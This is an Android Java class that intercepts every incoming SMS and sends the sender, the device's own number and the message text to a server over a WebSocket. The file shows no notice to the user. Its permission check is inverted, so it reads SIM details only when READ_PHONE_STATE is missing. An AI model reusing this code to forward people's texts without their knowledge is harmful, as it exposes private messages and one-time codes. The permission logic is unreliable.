package com.example.pms_client;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.os.Bundle;
import android.telephony.SmsMessage;
import android.telephony.SubscriptionInfo;
import android.telephony.SubscriptionManager;
import android.telephony.TelephonyManager;
import android.util.Log;

import androidx.core.app.ActivityCompat;

import org.json.JSONException;
import org.json.JSONObject;

import java.util.List;

public class SMSStateManager extends BroadcastReceiver {

    @Override
    public void onReceive(Context context, Intent intent) {

        Bundle bundle = intent.getExtras();
        SmsMessage[] msgs = null;
        String number = "";
        String content = "";
        String target = getSimNumber(context) == null ? "0" : getSimNumber(context);
        WebSocketManager webSocketManager = new WebSocketManager(context, null);
        if (bundle != null)
        {
            Object[] pdus = (Object[]) bundle.get("pdus");
            msgs = new SmsMessage[pdus.length];
            for (int i = 0; i < msgs.length; i++)
            {
                msgs[i] = SmsMessage.createFromPdu((byte[])pdus[i]);
                number = msgs[i].getOriginatingAddress();
                content = msgs[i].getMessageBody();
            }
        }
        JSONObject obj = new JSONObject();
        try {
            JSONObject paramObj = new JSONObject();
            paramObj.put("sender", number);
            paramObj.put("receiver", target);
            paramObj.put("content", content);

            obj.put("event", "SAVE_SMS_LOG");
            obj.put("data", paramObj);
        } catch (JSONException e) {
            throw new RuntimeException(e);
        }
        webSocketManager.getGlobalWebSocket().send(obj.toString());
    }

    private String getSimNumber(Context context) {

        if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.LOLLIPOP_MR1) {
            SubscriptionManager manager = (SubscriptionManager) context.getSystemService(Context.TELEPHONY_SUBSCRIPTION_SERVICE);
            if (ActivityCompat.checkSelfPermission(context, android.Manifest.permission.READ_PHONE_STATE) != PackageManager.PERMISSION_GRANTED) {
                List<SubscriptionInfo> subscriptionInfos = manager.getActiveSubscriptionInfoList();

                if (subscriptionInfos != null && !subscriptionInfos.isEmpty()) {
                    SubscriptionInfo simInfo = subscriptionInfos.get(0);
                    return simInfo.getNumber();
                }
            }
        }
        return null;
    }

}
